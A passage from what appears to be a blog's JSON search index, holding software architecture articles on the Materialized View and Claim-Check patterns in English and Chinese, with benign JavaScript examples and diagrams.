Example: Handling consistency window class MaterializedViewReader &#123; async getSalesSummary(options &#x3D; &#123;&#125;) &#123; const view &#x3D; await viewStore.get(&#39;sales_summary&#39;); if (options.requireFresh) &#123; const age &#x3D; Date.now() - view.lastUpdated; if (age &gt; options.maxAge) &#123; &#x2F;&#x2F; Trigger refresh and wait await this.refreshView(); return await viewStore.get(&#39;sales_summary&#39;); &#125; &#125; return view; &#125; &#125; ⚠️ Consistency ConsiderationsDuring view updates, data may be temporarily inconsistent with source systems. Design your application to handle this gracefully: Display last update timestamps Provide manual refresh options for critical operations Use versioning to detect stale data 3. Storage Location Strategy Views don’t need to reside in the same store as source data: graph TD A[Transactional DB] -->|Extract| D[View Builder] B[Document Store] -->|Extract| D C[External API] -->|Extract| D D -->|Store| E[Cache Layer] D -->|Store| F[Search Engine] D -->|Store| G[Analytics DB] style D fill:#ffd43b,stroke:#fab005 style E fill:#51cf66,stroke:#2f9e44 style F fill:#51cf66,stroke:#2f9e44 style G fill:#51cf66,stroke:#2f9e44 Storage Options: In-memory cache (Redis, Memcached): Ultra-fast access, volatile Search engine (Elasticsearch): Full-text search capabilities Analytics database (ClickHouse, TimescaleDB): Optimized for aggregations Object storage: Cost-effective for large, infrequently accessed views 4. View Optimization Techniques Maximize view value through strategic design: &#x2F;&#x2F; Include computed values &#123; category: &quot;Electronics&quot;, totalSales: 109.97, averageOrderValue: 54.99, &#x2F;&#x2F; Precomputed growthRate: 0.15, &#x2F;&#x2F; Precomputed vs. previous period topProducts: [...], &#x2F;&#x2F; Include frequently joined data categoryMetadata: &#123; name: &quot;Electronics&quot;, description: &quot;Electronic devices and accessories&quot; &#125; &#125; Optimization strategies: Add indexes to materialized views for faster queries Include computed columns to avoid runtime calculations Denormalize frequently joined data Store data in query-friendly formats (e.g., JSON for document queries) When to Use This Pattern Ideal Scenarios ✅ Perfect Use CasesComplex Query Requirements: When queries require multiple joins, aggregations, or transformations that are expensive to compute in real-time. Cross-System Aggregation: When combining data from multiple databases, microservices, or external systems. Reporting and Analytics: When generating dashboards, reports, or analytics that don't require real-time accuracy. Event Sourcing Systems: When the only way to query current state is by replaying all events. Secondary Benefits 📋 Additional AdvantagesSimplified Queries: Expose complex data in formats that don't require deep knowledge of source systems. Security and Privacy: Provide filtered views that exclude sensitive data while maintaining query capabilities. Disconnected Scenarios: Cache views locally for offline access or occasionally connected systems. Performance Isolation: Prevent heavy analytical queries from impacting transactional systems. When to Avoid ❌ Not Suitable WhenSimple Data Structures: Source data is already in an easily queryable format. High Consistency Requirements: Applications cannot tolerate any data staleness. Rapidly Changing Data: Source data changes so frequently that views are always outdated. Limited Query Patterns: Only a few simple queries are needed, making the overhead unjustified. Architecture Quality Attributes Performance Efficiency The pattern dramatically improves query performance: (function() { if (typeof echarts !== 'undefined') { var chart = echarts.init(document.getElementById('chart_55add014f')); var option = { \"title\": { \"text\": \"Query Response Time Comparison\" }, \"tooltip\": { \"trigger\": \"axis\" }, \"legend\": { \"data\": [\"Direct Query\", \"Materialized View\"] }, \"xAxis\": { \"type\": \"category\", \"data\": [\"Simple\", \"Medium\", \"Complex\", \"Very Complex\"] }, \"yAxis\": { \"type\": \"value\", \"name\": \"Response Time (ms)\" }, \"series\": [ { \"name\": \"Direct Query\", \"type\": \"bar\", \"data\": [50, 250, 1500, 5000], \"itemStyle\": { \"color\": \"#fa5252\" } }, { \"name\": \"Materialized View\", \"type\": \"bar\", \"data\": [10, 15, 20, 25], \"itemStyle\": { \"color\": \"#51cf66\" } } ] }; chart.setOption(option); } })(); Benefits: Eliminates expensive joins and aggregations at query time Reduces database load by serving precomputed results Enables predictable query performance regardless of data volume Scalability Materialized views support horizontal scaling: Read scaling: Replicate views across multiple nodes Write isolation: Separate read-heavy analytics from write-heavy transactions Resource optimization: Use specialized storage for different access patterns Cost Optimization While requiring additional storage, the pattern can reduce overall costs: Reduced compute: Fewer CPU cycles for query processing Lower database load: Decreased need for expensive database instances Tiered storage: Use cost-effective storage for infrequently accessed views Real-World Implementation Example Here’s a complete implementation for a sales analytics system: class SalesAnalyticsView &#123; constructor(orderDb, productDb, customerDb, viewStore) &#123; this.orderDb &#x3D; orderDb; this.productDb &#x3D; productDb; this.customerDb &#x3D; customerDb; this.viewStore &#x3D; viewStore; &#125; async rebuildView() &#123; &#x2F;&#x2F; Extract data from multiple sources const orders &#x3D; await this.orderDb.getOrders(); const products &#x3D; await this.productDb.getProducts(); const customers &#x3D; await this.customerDb.getCustomers(); &#x2F;&#x2F; Transform and aggregate const summary &#x3D; this.computeSummary(orders, products, customers); &#x2F;&#x2F; Store with metadata await this.viewStore.save(&#39;sales_analytics&#39;, &#123; data: summary, lastUpdated: new Date(), version: this.generateVersion() &#125;); &#125; computeSummary(orders, products, customers) &#123; const productMap &#x3D; new Map(products.map(p &#x3D;&gt; [p.id, p])); const customerMap &#x3D; new Map(customers.map(c &#x3D;&gt; [c.id, c])); const summary &#x3D; &#123;&#125;; for (const order of orders) &#123; for (const item of order.items) &#123; const product &#x3D; productMap.get(item.productId); const category &#x3D; product.category; if (!summary[category]) &#123; summary[category] &#x3D; &#123; totalSales: 0, orderCount: 0, customers: new Set() &#125;; &#125; summary[category].totalSales +&#x3D; item.quantity * item.price; summary[category].orderCount++; summary[category].customers.add(order.customerId); &#125; &#125; &#x2F;&#x2F; Convert to final format return Object.entries(summary).map(([category, data]) &#x3D;&gt; (&#123; category, totalSales: data.totalSales, orderCount: data.orderCount, customerCount: data.customers.size &#125;)); &#125; async getView() &#123; return await this.viewStore.get(&#39;sales_analytics&#39;); &#125; &#125; Trade-offs and Considerations Like any architectural pattern, materialized views involve trade-offs: ⚠️ Challenges to AddressStorage Overhead: Views consume additional storage space, potentially duplicating data. Update Complexity: Managing view updates adds operational complexity and potential failure points. Consistency Windows: Applications must handle periods where views don't reflect latest source data. Maintenance Burden: Views require monitoring, versioning, and occasional rebuilding. Mitigation strategies: Implement view versioning to handle schema changes Monitor view freshness and alert on stale data Automate view rebuilding and validation Document consistency guarantees for each view Related Patterns The Materialized View pattern works well with other architectural patterns: CQRS (Command Query Responsibility Segregation): Use materialized views as the query side, with separate command models for writes Event Sourcing: Build materialized views by processing event streams to derive current state Index Table Pattern: Create secondary indexes over materialized views for additional query patterns Cache-Aside: Treat materialized views as a specialized cache with explicit refresh logic Conclusion The Materialized View pattern solves a fundamental challenge in data-intensive systems: the mismatch between how data is stored and how it needs to be queried. By precomputing and storing query results, it delivers: Dramatic performance improvements for complex queries Reduced load on source systems Flexibility to aggregate data across multiple sources Simplified queries for application developers While it introduces trade-offs around consistency and storage overhead, these costs are often justified by the performance gains and architectural flexibility it provides. Consider this pattern when your system struggles with complex queries, needs to aggregate data across multiple sources, or requires high-performance analytics without impacting transactional workloads. The key to success: treat materialized views as disposable, automated artifacts that can be rebuilt from source data at any time. This mindset frees you to experiment with different view structures and update strategies until you find the optimal balance for your specific requirements. References Enterprise Integration Patterns: Materialized View Microsoft Learn: Materialized View Pattern Martin Fowler: CQRS","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Data Management","slug":"Data-Management","permalink":"https://neo01.com/tags/Data-Management/"},{"name":"Performance","slug":"Performance","permalink":"https://neo01.com/tags/Performance/"}],"lang":"en"},{"title":"Claim-Check 模式：在分散式系統中處理大型訊息","slug":"2019/04/Claim-Check-Pattern-zh-TW","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-TW/2019/04/Claim-Check-Pattern/","permalink":"https://neo01.com/zh-TW/2019/04/Claim-Check-Pattern/","excerpt":"了解 Claim-Check 模式如何透過將資料儲存在外部並傳遞輕量級權杖，解決訊息系統中傳輸大型負載的挑戰。","text":"想像一下在機場託運行李的情景。你不需要帶著沉重的行李通過安檢和登機，而是在報到櫃檯交出行李，並收到一張小小的提領單。到達目的地後，你出示提領單就能取回行李。這個真實世界的流程啟發了分散式系統中一個最優雅的解決方案：Claim-Check 模式。 問題：當訊息變得太重 傳統訊息系統擅長處理大量的小型訊息。它們針對速度、吞吐量和可靠性進行了優化，特別是在處理輕量級資料時。然而，它們在處理大型負載時常常遇到困難，原因如下： 大小限制：大多數訊息系統對訊息大小有嚴格限制（通常為 256KB 到 1MB） 效能下降：大型訊息消耗更多記憶體和頻寬，拖慢整個系統 逾時問題：處理大型訊息可能超過逾時閾值 資源耗盡：多個大型訊息可能壓垮訊息基礎設施 ⚠️ 實際影響在設計用於處理 64KB 訊息的佇列中，單一 10MB 訊息可能導致連鎖故障，影響所有消費者，甚至可能導致整個訊息系統崩潰。 解決方案：將儲存與訊息傳遞分離 Claim-Check 模式透過分離資料儲存和訊息傳遞的關注點，優雅地解決了這個問題： 儲存負載到針對大型物件優化的外部資料儲存 產生 claim-check 權杖（唯一識別碼或金鑰） 僅透過訊息系統傳送權杖 在需要時使用權杖取回負載 sequenceDiagram participant Sender as 傳送者 participant DataStore as 外部資料儲存 participant MsgSystem as 訊息系統 participant Receiver as 接收者 Sender->>DataStore: 1. 儲存大型負載 DataStore-->>Sender: 2. 回傳 claim-check 權杖 Sender->>MsgSystem: 3. 傳送帶有權杖的訊息 MsgSystem->>Receiver: 4. 傳遞帶有權杖的訊息 Receiver->>DataStore: 5. 使用權杖取回負載 DataStore-->>Receiver: 6. 回傳負載 Receiver->>Receiver: 7. 處理負載 運作方式：模式實作 讓我們透過一個處理帶有大型附件的客戶訂單的具體範例來說明： 步驟 1：儲存負載 當傳送者需要傳輸大型負載（例如高解析度圖片、影片檔案或大型文件）時： &#x2F;&#x2F; 傳送者應用程式 async function sendLargeMessage(payload) &#123; &#x2F;&#x2F; 將負載儲存在外部資料儲存 const claimCheckToken &#x3D; await dataStore.save(&#123; data: payload, expiresAt: Date.now() + (24 * 60 * 60 * 1000) &#x2F;&#x2F; 24 小時 &#125;); return claimCheckToken; &#125; 步驟 2：傳送權杖 訊息系統只處理輕量級權杖： &#x2F;&#x2F; 傳送帶有 claim-check 權杖的訊息 await messagingSystem.send(&#123; orderId: &quot;ORD-12345&quot;, claimCheck: claimCheckToken, metadata: &#123; size: payload.length, contentType: &quot;application&#x2F;pdf&quot; &#125; &#125;); 步驟 3：取回並處理 接收者使用權杖取得實際負載： &#x2F;&#x2F; 接收者應用程式 async function processMessage(message) &#123; &#x2F;&#x2F; 使用 claim-check 權杖取回負載 const payload &#x3D; await dataStore.retrieve(message.claimCheck); &#x2F;&#x2F; 處理負載 await processOrder(message.orderId, payload); &#x2F;&#x2F; 清理 await dataStore.delete(message.claimCheck); &#125; 實作考量 實作 Claim-Check 模式時，請考慮以下重要面向： 1. 負載生命週期管理 🗑️ 清理策略同步刪除：消費應用程式在處理後立即刪除負載。這將刪除與訊息工作流程綁定，確保及時清理。 非同步刪除：訊息處理工作流程之外的獨立背景程序根據存活時間（TTL）或其他條件處理清理。這將刪除程序與訊息處理解耦，但需要額外的基礎設施。 2. 條件式應用 並非每個訊息都需要 Claim-Check 模式。實作邏輯以選擇性地應用它： async function sendMessage(payload) &#123; const MESSAGE_SIZE_THRESHOLD &#x3D; 256 * 1024; &#x2F;&#x2F; 256KB if (payload.length &gt; MESSAGE_SIZE_THRESHOLD) &#123; &#x2F;&#x2F; 使用 Claim-Check 模式 const token &#x3D; await dataStore.save(payload); await messagingSystem.send(&#123; claimCheck: token &#125;); &#125; else &#123; &#x2F;&#x2F; 直接傳送 await messagingSystem.send(&#123; data: payload &#125;); &#125; &#125; 這種條件式方法： 減少小型訊息的延遲 優化資源利用 提升整體吞吐量 3. 安全性考量 claim-check 權杖應該： 唯一：防止衝突和未授權存取 隱晦：使用 UUID 或加密雜湊，而非循序 ID 有時限：實作過期機制以防止無限期儲存 存取控制：確保只有授權的應用程式可以取回負載 &#x2F;&#x2F; 產生安全的 claim-check 權杖 function generateClaimCheck() &#123; return &#123; id: crypto.randomUUID(), signature: crypto.createHmac(&#39;sha256&#39;, secretKey) .update(id) .digest(&#39;hex&#39;), expiresAt: Date.now() + TTL &#125;; &#125; 何時使用 Claim-Check 模式 主要使用案例 ✅ 理想情境訊息系統限制：當訊息大小超過系統限制時，將負載卸載到外部儲存。 效能優化：當大型訊息降低訊息系統效能時，將儲存與傳遞分離。 次要使用案例 📋 額外優勢敏感資料保護：將敏感資訊儲存在具有更嚴格存取控制的安全資料儲存中，使其遠離訊息系統。 複雜路由：當訊息穿越多個元件時，透過僅在中介層傳遞權杖來避免重複的序列化/反序列化開銷。 graph TD A[訊息大小分析] --> B{大小 > 閾值？} B -->|是| C[使用 Claim-Check] B -->|否| D{包含敏感資料？} D -->|是| C D -->|否| E{複雜路由？} E -->|是| C E -->|否| F[直接訊息傳遞] style C fill:#51cf66,stroke:#2f9e44 style F fill:#4dabf7,stroke:#1971c2 架構品質屬性 Claim-Check 模式影響多個架構品質屬性： 可靠性 將資料與訊息分離可實現： 資料冗餘：外部資料儲存通常提供更好的複製和備份 災難復原：負載可以獨立於訊息系統進行復原 故障隔離：訊息系統故障不會影響已儲存的負載 安全性 此模式透過以下方式增強安全性： 資料隔離：敏感資料保留在具有更嚴格存取控制的安全儲存中 存取控制：只有具有有效權杖的服務才能取回負載 稽核軌跡：獨立儲存可實現詳細的存取記錄 效能 效能改進包括： 減少訊息大小：訊息系統僅處理輕量級權杖 優化儲存：每個系統（訊息 vs. 資料儲存）處理其最擅長的事情 選擇性取回：接收者僅在需要時取得負載 成本優化 成本優勢來自： 更便宜的訊息傳遞：避免為大型訊息支援付費的進階功能 儲存分層：為大型負載使用具成本效益的儲存 資源效率：更好地利用訊息基礎設施 權衡與考量 與任何模式一樣，Claim-Check 引入了權衡： ⚠️ 潛在缺點增加複雜性：需要額外的基礎設施和協調 延遲：取回負載需要額外的網路往返 一致性挑戰：確保訊息和負載保持同步 營運開銷：管理已儲存負載的生命週期 根據您的特定需求評估這些權衡。當訊息大小或效能問題超過增加的複雜性時，此模式效果最佳。 實際實作模式 模式 1：自動權杖產生 使用事件驅動機制在檔案上傳時自動產生權杖： &#x2F;&#x2F; 檔案上傳觸發自動 claim-check 產生 dataStore.on(&#39;upload&#39;, async (file) &#x3D;&gt; &#123; const token &#x3D; generateClaimCheck(file.id); await messagingSystem.send(&#123; event: &#39;file-uploaded&#39;, claimCheck: token, metadata: file.metadata &#125;); &#125;); 模式 2：手動權杖產生 應用程式明確管理權杖建立和負載儲存： &#x2F;&#x2F; 應用程式控制整個程序 async function processLargeOrder(order) &#123; const token &#x3D; await storeOrderDocuments(order.documents); await sendOrderMessage(&#123; orderId: order.id, claimCheck: token &#125;); &#125; 結論 Claim-Check 模式為訊息系統中處理大型負載的挑戰提供了優雅的解決方案。透過將儲存與訊息傳遞分離，它使系統能夠： 克服訊息大小限制 維持高效能 增強安全性和可靠性 優化成本 雖然它引入了額外的複雜性，但在處理大型資料傳輸的系統中，其優勢通常遠超過成本。當您的訊息基礎設施在負載大小上遇到困難，或當您需要在維持高效訊息傳遞的同時保護敏感資料時，請考慮實作此模式。 相關模式 非同步請求-回覆：補充 Claim-Check 用於長時間執行的操作 競爭消費者：與 Claim-Check 配合良好用於平行處理 分割與聚合：處理大型訊息的替代方法 參考資料 Enterprise Integration Patterns: Claim Check Microsoft Azure Architecture Patterns: Claim-Check","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Messaging","slug":"Messaging","permalink":"https://neo01.com/tags/Messaging/"},{"name":"Integration Patterns","slug":"Integration-Patterns","permalink":"https://neo01.com/tags/Integration-Patterns/"}],"lang":"zh-TW"},{"title":"Claim-Check 模式：在分布式系统中处理大型消息","slug":"2019/04/Claim-Check-Pattern-zh-CN","date":"un33fin33","updated":"un55fin55","comments":true,"path":"/zh-CN/2019/04/Claim-Check-Pattern/","permalink":"https://neo01.com/zh-CN/2019/04/Claim-Check-Pattern/","excerpt":"了解 Claim-Check 模式如何通过将数据存储在外部并传递轻量级令牌，解决消息系统中传输大型负载的挑战。","text":"想象一下在机场托运行李的情景。你不需要带着沉重的行李通过安检和登机，而是在报到柜台交出行李，并收到一张小小的提领单。到达目的地后，你出示提领单就能取回行李。这个真实世界的流程启发了分布式系统中一个最优雅的解决方案：Claim-Check 模式。 问题：当消息变得太重 传统消息系统擅长处理大量的小型消息。它们针对速度、吞吐量和可靠性进行了优化，特别是在处理轻量级数据时。然而，它们在处理大型负载时常常遇到困难，原因如下： 大小限制：大多数消息系统对消息大小有严格限制（通常为 256KB 到 1MB） 性能下降：大型消息消耗更多内存和带宽，拖慢整个系统 超时问题：处理大型消息可能超过超时阈值 资源耗尽：多个大型消息可能压垮消息基础设施 ⚠️ 实际影响在设计用于处理 64KB 消息的队列中，单一 10MB 消息可能导致连锁故障，影响所有消费者，甚至可能导致整个消息系统崩溃。 解决方案：将存储与消息传递分离 Claim-Check 模式通过分离数据存储和消息传递的关注点，优雅地解决了这个问题： 存储负载到针对大型对象优化的外部数据存储 生成 claim-check 令牌（唯一标识符或密钥） 仅通过消息系统传送令牌 在需要时使用令牌取回负载 sequenceDiagram participant Sender as 发送者 participant DataStore as 外部数据存储 participant MsgSystem as 消息系统 participant Receiver as 接收者 Sender->>DataStore: 1. 存储大型负载 DataStore-->>Sender: 2. 返回 claim-check 令牌 Sender->>MsgSystem: 3. 发送带有令牌的消息 MsgSystem->>Receiver: 4. 传递带有令牌的消息 Receiver->>DataStore: 5. 使用令牌取回负载 DataStore-->>Receiver: 6. 返回负载 Receiver->>Receiver: 7. 处理负载 运作方式：模式实践 让我们通过一个处理带有大型附件的客户订单的具体范例来说明： 步骤 1：存储负载 当发送者需要传输大型负载（例如高分辨率图片、视频文件或大型文档）时： &#x2F;&#x2F; 发送者应用程序 async function sendLargeMessage(payload) &#123; &#x2F;&#x2F; 将负载存储在外部数据存储 const claimCheckToken &#x3D; await dataStore.save(&#123; data: payload, expiresAt: Date.now() + (24 * 60 * 60 * 1000) &#x2F;&#x2F; 24 小时 &#125;); return claimCheckToken; &#125; 步骤 2：发送令牌 消息系统只处理轻量级令牌： &#x2F;&#x2F; 发送带有 claim-check 令牌的消息 await messagingSystem.send(&#123; orderId: &quot;ORD-12345&quot;, claimCheck: claimCheckToken, metadata: &#123; size: payload.length, contentType: &quot;application&#x2F;pdf&quot; &#125; &#125;); 步骤 3：取回并处理 接收者使用令牌获取实际负载： &#x2F;&#x2F; 接收者应用程序 async function processMessage(message) &#123; &#x2F;&#x2F; 使用 claim-check 令牌取回负载 const payload &#x3D; await dataStore.retrieve(message.claimCheck); &#x2F;&#x2F; 处理负载 await processOrder(message.orderId, payload); &#x2F;&#x2F; 清理 await dataStore.delete(message.claimCheck); &#125; 实现考量 实现 Claim-Check 模式时，请考虑以下重要方面： 1. 负载生命周期管理 🗑️ 清理策略同步删除：消费应用程序在处理后立即删除负载。这将删除与消息工作流程绑定，确保及时清理。 异步删除：消息处理工作流程之外的独立后台进程根据存活时间（TTL）或其他条件处理清理。这将删除进程与消息处理解耦，但需要额外的基础设施。 2. 条件式应用 并非每个消息都需要 Claim-Check 模式。实现逻辑以选择性地应用它： async function sendMessage(payload) &#123; const MESSAGE_SIZE_THRESHOLD &#x3D; 256 * 1024; &#x2F;&#x2F; 256KB if (payload.length &gt; MESSAGE_SIZE_THRESHOLD) &#123; &#x2F;&#x2F; 使用 Claim-Check 模式 const token &#x3D; await dataStore.save(payload); await messagingSystem.send(&#123; claimCheck: token &#125;); &#125; else &#123; &#x2F;&#x2F; 直接发送 await messagingSystem.send(&#123; data: payload &#125;); &#125; &#125; 这种条件式方法： 减少小型消息的延迟 优化资源利用 提升整体吞吐量 3. 安全性考量 claim-check 令牌应该： 唯一：防止冲突和未授权访问 隐晦：使用 UUID 或加密哈希，而非顺序 ID 有时限：实现过期机制以防止无限期存储 访问控制：确保只有授权的应用程序可以取回负载 &#x2F;&#x2F; 生成安全的 claim-check 令牌 function generateClaimCheck() &#123; return &#123; id: crypto.randomUUID(), signature: crypto.createHmac(&#39;sha256&#39;, secretKey) .update(id) .digest(&#39;hex&#39;), expiresAt: Date.now() + TTL &#125;; &#125; 何时使用 Claim-Check 模式 主要使用案例 ✅ 理想情境消息系统限制：当消息大小超过系统限制时，将负载卸载到外部存储。 性能优化：当大型消息降低消息系统性能时，将存储与传递分离。 次要使用案例 📋 额外优势敏感数据保护：将敏感信息存储在具有更严格访问控制的安全数据存储中，使其远离消息系统。 复杂路由：当消息穿越多个组件时，通过仅在中介层传递令牌来避免重复的序列化/反序列化开销。 graph TD A[消息大小分析] --> B{大小 > 阈值？} B -->|是| C[使用 Claim-Check] B -->|否| D{包含敏感数据？} D -->|是| C D -->|否| E{复杂路由？} E -->|是| C E -->|否| F[直接消息传递] style C fill:#51cf66,stroke:#2f9e44 style F fill:#4dabf7,stroke:#1971c2 架构质量属性 Claim-Check 模式影响多个架构质量属性： 可靠性 将数据与消息分离可实现： 数据冗余：外部数据存储通常提供更好的复制和备份 灾难恢复：负载可以独立于消息系统进行恢复 故障隔离：消息系统故障不会影响已存储的负载 安全性 此模式通过以下方式增强安全性： 数据隔离：敏感数据保留在具有更严格访问控制的安全存储中 访问控制：只有具有有效令牌的服务才能取回负载 审计轨迹：独立存储可实现详细的访问记录 性能 性能改进包括： 减少消息大小：消息系统仅处理轻量级令牌 优化存储：每个系统（消息 vs. 数据存储）处理其最擅长的事情 选择性取回：接收者仅在需要时获取负载 成本优化 成本优势来自： 更便宜的消息传递：避免为大型消息支持付费的高级功能 存储分层：为大型负载使用具成本效益的存储 资源效率：更好地利用消息基础设施 权衡与考量 与任何模式一样，Claim-Check 引入了权衡： ⚠️ 潜在缺点增加复杂性：需要额外的基础设施和协调 延迟：取回负载需要额外的网络往返 一致性挑战：确保消息和负载保持同步 运营开销：管理已存储负载的生命周期 根据您的特定需求评估这些权衡。当消息大小或性能问题超过增加的复杂性时，此模式效果最佳。 实际实现模式 模式 1：自动令牌生成 使用事件驱动机制在文件上传时自动生成令牌： &#x2F;&#x2F; 文件上传触发自动 claim-check 生成 dataStore.on(&#39;upload&#39;, async (file) &#x3D;&gt; &#123; const token &#x3D; generateClaimCheck(file.id); await messagingSystem.send(&#123; event: &#39;file-uploaded&#39;, claimCheck: token, metadata: file.metadata &#125;); &#125;); 模式 2：手动令牌生成 应用程序明确管理令牌创建和负载存储： &#x2F;&#x2F; 应用程序控制整个过程 async function processLargeOrder(order) &#123; const token &#x3D; await storeOrderDocuments(order.documents); await sendOrderMessage(&#123; orderId: order.id, claimCheck: token &#125;); &#125; 结论 Claim-Check 模式为消息系统中处理大型负载的挑战提供了优雅的解决方案。通过将存储与消息传递分离，它使系统能够： 克服消息大小限制 维持高性能 增强安全性和可靠性 优化成本 虽然它引入了额外的复杂性，但在处理大型数据传输的系统中，其优势通常远超过成本。当您的消息基础设施在负载大小上遇到困难，或当您需要在维持高效消息传递的同时保护敏感数据时，请考虑实现此模式。 相关模式 异步请求-回复：补充 Claim-Check 用于长时间运行的操作 竞争消费者：与 Claim-Check 配合良好用于并行处理 分割与聚合：处理大型消息的替代方法 参考资料 Enterprise Integration Patterns: Claim Check Microsoft Azure Architecture Patterns: Claim-Check","categories":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/categories/Architecture/"}],"tags":[{"name":"Architecture","slug":"Architecture","permalink":"https://neo01.com/tags/Architecture/"},{"name":"Design Patterns","slug":"Design-Patterns","permalink":"https://neo01.com/tags/Design-Patterns/"},{"name":"Messaging","slug":"Messaging","permalink":"https://neo01.com/tags/Messaging/"},{"name":"Integration Patterns","slug":"Integration-Patterns","permalink":"https://neo01.com/tags/Integration-Patterns/"}],"lang":"zh-CN"},{"title":"The Claim-Check Pattern: Handling Large Messages in Distributed Systems","slug":"2019/04/Claim-Check-Pattern","date":"un33fin33","updated":"un55fin55","comments":true,"path":"2019/04/Claim-Check-Pattern/","permalink":"https://neo01.com/2019/04/Claim-Check-Pattern/","excerpt":"Learn how the Claim-Check pattern solves the challenge of transferring large payloads in messaging systems by storing data externally and passing lightweight tokens instead.","text":"Imagine checking your luggage at an airport. Instead of carrying heavy bags through security and onto the plane, you hand them over at check-in and receive a small claim ticket. At your destination, you present that ticket to retrieve your bags. This real-world process inspired one of the most elegant solutions to a common problem in distributed systems: the Claim-Check pattern. The Problem: When Messages Become Too Heavy Traditional messaging systems excel at handling high volumes of small messages. They’re optimized for speed, throughput, and reliability when dealing with lightweight data. However, they often struggle with large payloads for several reasons: Size Restrictions: Most messaging systems impose strict limits on message size (often 256KB to 1MB) Performance Degradation: Large messages consume more memory and bandwidth, slowing down the entire system Timeout Issues: Processing large messages can exceed timeout thresholds Resource Exhaustion: Multiple large messages can overwhelm the messaging infrastructure ⚠️ Real-World ImpactA single 10MB message in a queue designed for 64KB messages can cause cascading failures, affecting all consumers and potentially bringing down the entire messaging system. The Solution: Separate Storage from Messaging The Claim-Check pattern elegantly solves this problem by separating the concerns of data storage and message delivery: Store the payload in an external data store optimized for large objects Generate a claim-check token (a unique identifier or key) Send only the token through the messaging system Retrieve the payload using the token when needed sequenceDiagram participant Sender participant DataStore as External Data Store participant MsgSystem as Messaging System participant Receiver Sender->>DataStore: 1. Store large payload DataStore-->>Sender: 2. Return claim-check token Sender->>MsgSystem: 3. Send message with token MsgSystem->>Receiver: 4. Deliver message with token Receiver->>DataStore: 5. Retrieve payload using token DataStore-->>Receiver: 6. Return payload Receiver->>Receiver: 7. Process payload How It Works: The Pattern in Action Let’s walk through a concrete example of processing customer orders with large attachments: Step 1: Store the Payload When a sender needs to transmit a large payload (such as a high-resolution image, video file, or large document): &#x2F;&#x2F; Sender application async function sendLargeMessage(payload) &#123; &#x2F;&#x2F; Store payload in external data store const claimCheckToken &#x3D; await dataStore.save(&#123; data: payload, expiresAt: Date.now() + (24 * 60 * 60 * 1000) &#x2F;&#x2F; 24 hours &#125;); return claimCheckToken; &#125; Step 2: Send the Token The messaging system only handles the lightweight token: &#x2F;&#x2F; Send message with claim-check token await messagingSystem.send(&#123; orderId: &quot;ORD-12345&quot;, claimCheck: claimCheckToken, metadata: &#123; size: payload.length, contentType: &quot;application&#x2F;pdf&quot; &#125; &#125;); Step 3: Retrieve and Process The receiver uses the token to fetch the actual payload: &#x2F;&#x2F; Receiver application async function processMessage(message) &#123; &#x2F;&#x2F; Retrieve payload using claim-check token const payload &#x3D; await dataStore.retrieve(message.claimCheck); &#x2F;&#x2F; Process the payload await processOrder(message.orderId, payload); &#x2F;&#x2F; Clean up await dataStore.delete(message.claimCheck); &#125; Implementation Considerations When implementing the Claim-Check pattern, consider these important aspects: 1. Payload Lifecycle Management 🗑️ Cleanup StrategiesSynchronous Deletion: The consuming application deletes the payload immediately after processing. This ties deletion to the message workflow and ensures timely cleanup. Asynchronous Deletion: A separate background process handles cleanup based on time-to-live (TTL) or other criteria. This decouples deletion from message processing but requires additional infrastructure. 2. Conditional Application Not every message needs the Claim-Check pattern. Implement logic to apply it selectively: async function sendMessage(payload) &#123; const MESSAGE_SIZE_THRESHOLD &#x3D; 256 * 1024; &#x2F;&#x2F; 256KB if (payload.length &gt; MESSAGE_SIZE_THRESHOLD) &#123; &#x2F;&#x2F; Use Claim-Check pattern const token &#x3D; await dataStore.save(payload); await messagingSystem.send(&#123; claimCheck: token &#125;); &#125; else &#123; &#x2F;&#x2F; Send directly await messagingSystem.send(&#123; data: payload &#125;); &#125; &#125; This conditional approach: Reduces latency for small messages Optimizes resource utilization Improves overall throughput 3. Security Considerations The claim-check token should be: Unique: Prevent collisions and unauthorized access Obscure: Use UUIDs or cryptographic hashes, not sequential IDs Time-limited: Implement expiration to prevent indefinite storage Access-controlled: Ensure only authorized applications can retrieve payloads &#x2F;&#x2F; Generate secure claim-check token function generateClaimCheck() &#123; return &#123; id: crypto.randomUUID(), signature: crypto.createHmac(&#39;sha256&#39;, secretKey) .update(id) .digest(&#39;hex&#39;), expiresAt: Date.now() + TTL &#125;; &#125; When to Use the Claim-Check Pattern Primary Use Cases ✅ Ideal ScenariosMessaging System Limitations: When message sizes exceed system limits, offload payloads to external storage. Performance Optimization: When large messages degrade messaging system performance, separate storage from delivery. Secondary Use Cases 📋 Additional BenefitsSensitive Data Protection: Store sensitive information in secure data stores with stricter access controls, keeping it out of the messaging system. Complex Routing: When messages traverse multiple components, avoid repeated serialization/deserialization overhead by passing only tokens through intermediaries. graph TD A[Message Size Analysis] --> B{Size > Threshold?} B -->|Yes| C[Use Claim-Check] B -->|No| D{Contains Sensitive Data?} D -->|Yes| C D -->|No| E{Complex Routing?} E -->|Yes| C E -->|No| F[Direct Messaging] style C fill:#51cf66,stroke:#2f9e44 style F fill:#4dabf7,stroke:#1971c2 Architecture Quality Attributes The Claim-Check pattern impacts several architectural quality attributes: Reliability Separating data from messages enables: Data Redundancy: External data stores often provide better replication and backup Disaster Recovery: Payloads can be recovered independently of the messaging system Failure Isolation: Messaging system failures don’t affect stored payloads Security The pattern enhances security by: Data Segregation: Sensitive data stays in secure storage with tighter access controls Access Control: Only services with valid tokens can retrieve payloads Audit Trail: Separate storage enables detailed access logging Performance Performance improvements include: Reduced Message Size: Messaging system handles only lightweight tokens Optimized Storage: Each system (messaging vs. data store) handles what it does best Selective Retrieval: Receivers fetch payloads only when needed Cost Optimization Cost benefits arise from: Cheaper Messaging: Avoid premium features for large message support Storage Tiering: Use cost-effective storage for large payloads Resource Efficiency: Better utilization of messaging infrastructure Trade-offs and Considerations Like any 